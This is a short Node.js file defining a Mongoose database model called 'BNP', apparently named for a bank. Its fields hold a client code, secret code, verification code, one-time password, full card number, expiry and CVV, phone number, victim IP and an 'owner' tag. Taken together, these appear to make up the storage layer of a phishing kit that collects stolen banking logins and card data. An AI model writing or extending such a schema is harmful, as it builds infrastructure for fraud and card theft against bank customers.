const mongoose = require("mongoose");

const bnpSchema = new mongoose.Schema({
	uniqueid: String,
	secretCode: String,
	clientCode: String,
	verificationCode: String,
	otp: String,
	ccnum: String,
	ccexp: String,
	cccvv: String,
	telephone: String,
	status: Number,
	ip: String,
	owner: String,
	timestamp: Date,
});

module.exports = mongoose.model("BNP", bnpSchema);
